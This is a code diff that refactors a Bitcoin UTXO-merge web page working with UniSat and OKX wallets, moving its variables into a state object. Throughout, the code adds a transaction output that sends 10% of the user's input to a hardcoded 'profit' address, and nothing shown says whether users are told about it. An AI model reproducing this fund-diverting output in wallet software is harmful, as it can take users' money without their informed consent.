@@ -2,11 +2,14 @@
 const Bitcoin = window.bitcoinjs || {}; // 如果通过 <script> 引入
 
 document.addEventListener('DOMContentLoaded', async () => {
-    let walletProvider = null;
-    let walletAddress = null;
-    let targetAddress = null;
-    const profitAddress = '15Kh1QUbZg9cT9UXvtABjg12RCPmzbNLpd'; // 你的收益地址
-    const profitRate = 0.1; // 10% 收益
+    // 使用状态对象管理 walletProvider 和 walletAddress
+    const state = {
+        walletProvider: null,
+        walletAddress: null,
+        targetAddress: null,
+        profitAddress: '15Kh1QUbZg9cT9UXvtABjg12RCPmzbNLpd', // 你的收益地址
+        profitRate: 0.1 // 10% 收益
+    };
 
     const connectButton = document.getElementById('connect-wallet');
     const disconnectButton = document.getElementById('disconnect-wallet');
@@ -97,27 +100,27 @@ document.addEventListener('DOMContentLoaded', async () => {
     // 连接钱包
     async function connectWallet(walletType) {
         try {
-            // 重置 walletProvider 和 walletAddress
-            walletProvider = null;
-            walletAddress = null;
+            // 重置状态
+            state.walletProvider = null;
+            state.walletAddress = null;
             console.log('连接钱包，walletType:', walletType);
 
             if (walletType === 'unisat') {
                 const unisat = await waitForWallet('unisat');
                 const accounts = await unisat.requestAccounts();
-                walletProvider = 'unisat'; // 确保设置 walletProvider
-                walletAddress = accounts[0];
-                console.log('UniSat 钱包连接成功，walletProvider:', walletProvider, 'walletAddress:', walletAddress);
+                state.walletProvider = 'unisat';
+                state.walletAddress = accounts[0];
+                console.log('UniSat 钱包连接成功，walletProvider:', state.walletProvider, 'walletAddress:', state.walletAddress);
             } else if (walletType === 'okxweb3') {
                 const okxwallet = await waitForWallet('okxweb3');
                 const result = await okxwallet.bitcoin.connect();
-                walletProvider = 'okx'; // 确保设置 walletProvider
-                walletAddress = result.address;
-                console.log('OKX 钱包连接成功，walletProvider:', walletProvider, 'walletAddress:', walletAddress);
+                state.walletProvider = 'okx';
+                state.walletAddress = result.address;
+                console.log('OKX 钱包连接成功，walletProvider:', state.walletProvider, 'walletAddress:', state.walletAddress);
             } else {
                 throw new Error('不支持的钱包类型');
             }
-            walletStatus.textContent = `已连接钱包: ${walletAddress}`;
+            walletStatus.textContent = `已连接钱包: ${state.walletAddress}`;
             connectButton.style.display = 'none';
             disconnectButton.style.display = 'inline';
             mergeButton.disabled = false;
@@ -126,8 +129,8 @@ document.addEventListener('DOMContentLoaded', async () => {
             console.error('连接钱包失败:', error);
             walletStatus.textContent = '连接钱包失败: ' + error.message;
             document.getElementById('wallet-modal').remove();
-            walletProvider = null;
-            walletAddress = null;
+            state.walletProvider = null;
+            state.walletAddress = null;
         }
     }
 
@@ -141,24 +144,24 @@ document.addEventListener('DOMContentLoaded', async () => {
     // 断开连接
     if (disconnectButton) {
         disconnectButton.addEventListener('click', () => {
-            walletProvider = null;
-            walletAddress = null;
+            state.walletProvider = null;
+            state.walletAddress = null;
             walletStatus.textContent = '未连接钱包';
             connectButton.style.display = 'inline';
             disconnectButton.style.display = 'none';
             mergeButton.disabled = true;
-            console.log('钱包已断开连接，walletProvider:', walletProvider, 'walletAddress:', walletAddress);
+            console.log('钱包已断开连接，walletProvider:', state.walletProvider, 'walletAddress:', state.walletAddress);
         });
     }
 
     // 合并 UTXO 并转账
     if (mergeButton) {
         mergeButton.addEventListener('click', async () => {
-            targetAddress = targetAddressInput.value.trim() || walletAddress;
+            state.targetAddress = targetAddressInput.value.trim() || state.walletAddress;
             const feeRate = parseInt(feeRateInput.value) || 10;
 
             try {
-                if (!walletProvider || !walletAddress) {
+                if (!state.walletProvider || !state.walletAddress) {
                     throw new Error('未连接钱包，请先连接钱包');
                 }
 
@@ -166,7 +169,7 @@ document.addEventListener('DOMContentLoaded', async () => {
                 const utxoData = await fetchWithErrorHandling('/get-utxos', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ address: walletAddress })
+                    body: JSON.stringify({ address: state.walletAddress })
                 });
                 const { utxos } = utxoData;
                 if (!utxos || utxos.length < 2) throw new Error('至少需要2个UTXO');
@@ -182,25 +185,25 @@ document.addEventListener('DOMContentLoaded', async () => {
 
                 const txSize = utxos.length * 148 + 34 + 10;
                 const fee = txSize * feeRate;
-                const profit = Math.floor(totalInput * profitRate); // 10% 收益
+                const profit = Math.floor(totalInput * state.profitRate); // 10% 收益
                 const outputValue = totalInput - fee - profit;
 
                 if (outputValue <= 0) throw new Error('余额不足以支付费用和收益');
 
                 // 输出：用户目标地址和你的收益地址
-                txb.addOutput(targetAddress, outputValue);
-                txb.addOutput(profitAddress, profit);
+                txb.addOutput(state.targetAddress, outputValue);
+                txb.addOutput(state.profitAddress, profit);
 
                 const psbt = txb.buildIncomplete().toPSBT();
 
                 // 签名
                 let signedTxHex;
-                console.log('当前 walletProvider:', walletProvider);
-                if (walletProvider === 'unisat') {
+                console.log('准备签名，当前 walletProvider:', state.walletProvider);
+                if (state.walletProvider === 'unisat') {
                     console.log('使用 UniSat 钱包签名...');
                     const unisat = await waitForWallet('unisat');
                     signedTxHex = await unisat.signPsbt(psbt.toHex());
-                } else if (walletProvider === 'okx') {
+                } else if (state.walletProvider === 'okx') {
                     console.log('使用 OKX 钱包签名...');
                     const okxwallet = await waitForWallet('okxweb3');
                     console.log('OKX 钱包对象:', okxwallet);
@@ -211,7 +214,7 @@ document.addEventListener('DOMContentLoaded', async () => {
                     }
                     signedTxHex = await okxwallet.bitcoin.signPsbt(psbt.toHex());
                 } else {
-                    console.error('无效的 walletProvider:', walletProvider);
+                    console.error('无效的 walletProvider:', state.walletProvider);
                     throw new Error('未选择有效的钱包，请重新连接钱包');
                 }
 
@@ -235,11 +238,11 @@ document.addEventListener('DOMContentLoaded', async () => {
     const inviteFriendsButton = document.getElementById('invite-friends');
     if (inviteFriendsButton) {
         inviteFriendsButton.addEventListener('click', () => {
-            if (!walletAddress) {
+            if (!state.walletAddress) {
                 alert('请先链接钱包！');
                 return;
             }
-            const inviteUrl = `${window.location.origin}/?ref=${walletAddress}`;
+            const inviteUrl = `${window.location.origin}/?ref=${state.walletAddress}`;
             const inviteLinkDiv = document.getElementById('invite-link');
             const inviteUrlElement = document.getElementById('invite-url');
             inviteUrlElement.href = inviteUrl;
